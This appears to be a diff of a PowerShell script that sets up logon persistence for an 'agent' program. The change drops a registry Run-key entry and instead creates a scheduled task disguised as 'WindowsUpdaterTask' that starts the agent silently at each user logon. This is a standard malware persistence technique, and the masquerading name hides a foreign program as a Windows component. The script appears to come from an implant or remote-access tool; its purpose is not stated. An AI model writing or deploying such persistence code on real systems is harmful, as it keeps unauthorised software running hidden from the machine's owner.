@@ -6,9 +6,14 @@ if (-not $agentPath) {
     exit
 }
 
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$regName = "WindowsUpdater"
+$taskName = "WindowsUpdaterTask"
+$taskCommand = "cmd.exe"
+$taskArguments = "/c start /b `"`" `"$agentPath`""
 
-Set-ItemProperty -Path $regPath -Name $regName -Value $agentPath
-
-Write-Output "✅ Persistence added. Agent will run at next logon."
+# Create scheduled task that runs at user logon
+try {
+    schtasks /create /tn $taskName /tr "$taskCommand $taskArguments" /sc onlogon /ru $env:USERNAME /f /it | Out-Null
+    Write-Output "✅ Scheduled task '$taskName' created. Agent will run at next logon."
+} catch {
+    Write-Output "❌ Failed to create task: $_"
+}
